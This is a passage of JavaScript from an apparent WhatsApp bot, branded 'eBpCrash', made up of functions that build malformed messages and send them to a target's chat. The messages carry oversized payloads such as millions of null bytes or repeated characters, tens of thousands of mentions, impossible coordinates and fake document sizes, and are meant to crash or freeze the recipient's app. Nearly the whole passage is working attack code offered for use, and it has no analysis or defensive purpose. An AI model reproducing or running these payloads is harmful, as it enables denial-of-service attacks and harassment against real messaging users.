8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽",
								body: "⭑ɛɮք ƈʀ͢ǟֆɦ⭑̤ϟ",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/raditx7",
								mediaUrl: "https://www.instagram.com/raditx7",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/raditx7"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 TxOs 𝐁𝐲 ｢ eBpCrash ｣"));
		};
		
		async function InVisiLoc(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ ⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + ''.repeat(99999),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤〽️",
										"address": "✨⃟༑⌁⃰⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤〽️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: "⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤〽️ ",
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: null
				}
			);
			await ekuzika.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 InVisiLoc 𝐁𝐲 ｢ eBpCrash ｣"));
		};
		
		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: ekuzika.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1040000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ekuzika.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}
		
		async function PirVid(nom) {
		var video = await prepareWAMessageMedia({
         video: {
            url: 'https://pomf2.lain.la/f/oj96axw.mp4'
         }
      }, {
         upload: ekuzika.waUploadToServer
      })
      let etc = generateWAMessageFromContent(nom, proto.Message.fromObject({
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: 'Hehehe keresh kah bnha?:v'
  },
  footer: {
     text: '⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤'
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     messageParamsJson: '𑜦'.repeat(980000)
  },              
    }
       }
          }
      }), {
            userJid: nom,
		    quoted: null
		});
		await ekuzika.relayMessage(nom, etc.message, {
				participant: {
					jid: nom
				},
				messageId: etc.key.id
			});
		}
		
		async function bug1(a, b) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              locationMessage: {
                degreesLatitude: "p",
                degreesLongitude: "Co",
                caption: "⭑ɛɮք ƈʀ͢ǟֆɦ⭑̤" + "\0".repeat(1000000),
                jpegThumbnail: null,
              },
            },
          },
        }),
        {
          userJid: a,
          quoted: b,
        }
      );
      await ekuzika.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
      console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 loc1 𝐁𝐲 ｢ eBpCrash ｣"));
    }
    
    async function sendExtendedTextMessage(jid) {
  ekuzika.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '⭑ɛɮք ƈʀ͢ǟֆɦ',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': `⭑̤ɛɮք ƈʀ͢ǟֆɦ⭑̤\n\n\n\n\n\n\n\n\n` + '\u0000'.repeat(999999)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

    async function ZnX(X, Txt, Amount, Ptcp = true) {
			await ekuzika.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 ZnX 𝐁𝐲 ｢ eBpCrash ｣"));
		};
    
    async function StuckNull(X, ThM, Ptcp = true) {
			await ekuzika.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ 🩸⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡🦠 ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ 🩸⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡🦠 ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "0@".repeat(99999),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰🩸⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡🦠', url: \"https://wa.me/settings\", merchant_url: \"https://wa.me/settings\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6281991410940@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🩸⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡🦠",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 StuckNull 𝐁𝐲 ｢ eBpCrash ｣"));
		};
		
		
    async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "ꦾꦾꦾ⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ͜͡" + "ꦾ" + "ꦾ".repeat(77777) + "@1".repeat(203000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await ekuzika.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 ClPmNull 𝐁𝐲 ｢ eBpCrash ｣"));
    }
    
		async function StukLoc(jid, qtd, tHm, Ptcp = false) {
      const _0x4a8e9e = {
        text: ''.repeat(99999)
      };
      let etc = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + '\0'.repeat(99999),
                'locationMessage': {
                  'degreesLatitude': -999.035,
                  'degreesLongitude': 922.999999999999,
                  'name': "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
                  'address': "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
                  'jpegThumbnail': tHm
                },
                'hasMediaAttachment': true
              },
              'body': _0x4a8e9e,
              'nativeFlowMessage': {
                'messageParamsJson': " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': {
                    'title': "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
                    'sections': [{
                      'title': "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
                      'rows': []
                    }]
                  }
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': {}
                }]
              }
            }
          }
        }
      }), {
        'userJid': jid,
        'quoted': qtd
      });
      await ekuzika.relayMessage(jid, etc.message, Ptcp ? {
        'participant': {
          'jid': jid
        }
      } : {});
      console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 StukLoc 𝐁𝐲 ｢ eBpCrash ｣"));
    } ;
    
    const _0x8f1afc = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast",
        fromMe: false
      } : {})
    };
    const _0x140c8a = {
      key: _0x8f1afc,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./database/image/xbug.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: {
                  value: 49981399788,
                  offset: 100
                },
                reference_id: "4OON4PX3FFJ",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: {
                    value: 49069994400,
                    offset: 100
                  },
                  tax: {
                    value: 490699944,
                    offset: 100
                  },
                  discount: {
                    value: 485792999999,
                    offset: 100
                  },
                  shipping: {
                    value: 48999999900,
                    offset: 100
                  },
                  order_type: "ORDER".repeat(999),
                  items: [{
                    retailer_id: "7842674605763435",
                    product_id: "7842674605763435",
                    name: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ.͜͡✅⃟╮" + '\0'.repeat(99999),
                    amount: {
                      value: 9999900,
                      offset: 100
                    },
                    quantity: 7
                  }, {
                    retailer_id: "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                    name: "".repeat(1000000),
                    amount: {
                      value: 999999900,
                      offset: 100
                    },
                    quantity: 49
                  }]
                },
                native_payment_methods: []
              })
            }]
          }
        }
      }
    };
    
    async function LockCrash(jid, _0xbc9f87, _0x2be1ab) {
      const _0x48d484 = proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ\n" + buttonkal + bugpdf,
              url: "\0" + "ꦾ࣯".repeat(350000),
              jpegThumbnail: _0x2be1ab
            }
          }
        }
      });
      const _0x12d0d3 = generateWAMessageFromContent(jid, _0x48d484, {
        userJid: jid,
        quoted: null
      });
      await ekuzika.relayMessage(jid, _0x12d0d3.message, {
        participant: {
          jid: jid,
          quoted: null
        }
      });
      console.log(chalk.blue("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 LockCrash 𝐁𝐲 ｢ eBpCrash ｣"));
    }
    
    //SPAMMING FLOODS\\
async function sendLoc(LockJids, QUOTED) {
  var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        "liveLocationMessage": {
          "degreesLatitude": "x",
          "degreesLongitude": "x",
          "caption": '͟͟͞͞🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ 𝐀𝐥𝐰𝐚𝐲𝐬𝐅𝐚𝐱𝐳 ⌟ ▾ ༑̴⟆̤̊★🍂' + "★".repeat(750000),
          "sequenceNumber": "0",
          "jpegThumbnail": ""
        }
      }
    }
  }), {
    userJid: LockJids,
    quoted: QUOTED
  });
  await ekuzika.relayMessage(LockJids, etc.message, {
    messageId: etc.key.id
  });
}

async function invisIos(jid, Ptcp = false) {
  await ekuzika.relayMessage(jid, {
    extendedTextMessage: {
      text: '༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ',
      contextInfo: {
        mentionedJid: ["628387979@s.whatsapp.net", ...Array.from({
          length: 30000
        }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net")],
        stanzaId: "EXTREME1234567890ABCDEF",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          callLogMessage: {
            isVideo: false,
            callOutcome: "9999",
            durationSecs: "0",
            callType: "REGULAR",
            participants: Array.from({
              length: 99999
            }, () => ({
              jid: "0@s.whatsapp.net",
              callOutcome: "1"
            }))
          }
        },
        remoteJid: jid,
        conversionSource: "Ultimate Enhanced X",
        conversionData: "Super extended encoded data, adding even more data to intensify processing overload...",
        conversionDelaySeconds: 5,
        forwardingScore: 999999999,
        isForwarded: true,
        quotedAd: {
          advertiserName: "Ultimate Data X",
          mediaType: "VIDEO",
          jpegThumbnail: "UltraExtendedThumbnailDataLonger/9j/4AAQSkZ...",
          caption: "Extreme Caption to further increase processing",
          campaignId: "MegaCampaign2023"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "EXTENDED_ID_FOR_SUPER_TEST_1234567890"
        },
        expiration: 3456477523543275000,
        ephemeralSettingTimestamp: "Maxed Timestamp",
        ephemeralSharedSecret: "ULTIMATE_ULTRA_SHARING_SECRET",
        externalAdReply: {
          title: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
          body: "💀 ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ 💀",
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewType: "VIDEO",
          thumbnail: "ExtendedThumbnail",
          sourceType: "MAX Source",
          sourceId: "ExtendedSourceID",
          sourceUrl: "https://example.com/ExtendedURL",
          mediaUrl: "https://example.com/ExtendedMedia",
          containsAutoReply: true,
          showAdAttribution: true,
          ctwaClid: "Extended_ctwa_clid",
          ref: "ExtendedRef",
          largeImagePreviewUrl: "https://example.com/LargePreviewImage"
        },
        entryPointConversionSource: "ultimate_entry_point",
        entryPointConversionApp: "Extended Ultimate App",
        entryPointConversionDelaySeconds: 1,
        disappearingMode: {},
        actionLink: {
          url: "https://example.com/ExtendedActionLink"
        },
        groupSubject: "Ultimate Maximum Subject",
        parentGroupJid: "628387979-EXTREME_TEST_GROUP@g.us",
        trustBannerType: "Ultimate Extreme Trust",
        trustBannerAction: 4,
        isSampled: true,
        utm: {
          utmSource: "Extended Ultimate Source",
          utmCampaign: "Extended Ultimate Campaign"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "628387979-EXTENDED_TEST_NEWS@g.us",
          serverMessageId: 4,
          newsletterName: "Extended Ultimate Newsletter",
          contentType: "Extended Content",
          accessibilityText: "Extended Extreme Text"
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "ExtendedOwner@s.whatsapp.net"
        },
        smbClientCampaignId: "Extended_client_campaign_id",
        smbServerCampaignId: "Extended_server_campaign_id",
        dataSharingContext: {
          showMmDisclosure: true,
          privacyPolicyUrl: "https://example.com/ExtendedPrivacyPolicy"
        },
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ\n" + "ꦾ".repeat(920000),
          url: "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.tiktok.com/login&ved=2ahUKEwjoofub_LaJAxV0VWwGHRbTE5sQFnoECAsQAQ&usg=AOvVaw2iyH8WQ2LCBOlE_xMJEbJK\n" + "ꦾ࣯".repeat(74000),
          jpegThumbnail: "UltraExtendedThumbnailDataLonger/9j/4AAQSkZ..."
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: jid
    }
  } : {});
  console.log(chalk.blue("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 invisIos 𝐁𝐲 ｢ eBpCrash ｣"));
}
    
    async function CallCrash(jid, ptcp = false) {
      await ekuzika.relayMessage(jid, {
        extendedTextMessage: {
          text: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ",
          contextInfo: {
            stanzaId: "1234567890ABCDEF",
            participant: "62895364760801@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "62895364760801@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: jid,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 99999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption"
            },
            placeholderKey: {
              remoteJid: "62895364760801@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "EBPCRASH ",
              body: "☠️ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ☠️",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQA